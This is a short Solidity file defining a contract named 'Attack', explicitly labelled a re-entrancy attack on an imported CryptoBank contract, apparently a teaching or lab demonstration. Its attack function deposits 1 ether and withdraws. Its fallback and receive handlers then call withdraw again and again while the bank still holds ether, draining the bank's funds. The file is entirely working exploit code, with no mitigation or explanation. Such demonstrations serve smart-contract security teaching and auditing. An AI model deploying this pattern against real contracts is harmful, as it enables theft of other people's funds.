// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import './CryptoBank.sol';

//Re-entrancy Attack

contract Attack {

    CryptoBank public _CryptoBank;
    string public whocalled;

    constructor(address _cryptoBankAddress) {
        _CryptoBank = CryptoBank(_cryptoBankAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        _CryptoBank.deposit{value: 1 ether}();
        _CryptoBank.withdraw();
    }

    // Fallback is called when CryptoBank sends Ether to this contract.
    fallback() external payable {
        whocalled = 'fallback';
        if (address(_CryptoBank).balance > 1 ether ) {
            _CryptoBank.withdraw();
        }
    }

    receive() external payable {
        whocalled = 'receive';
        if (address(_CryptoBank).balance >= 1 ether ) {
            _CryptoBank.withdraw();
        }

    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}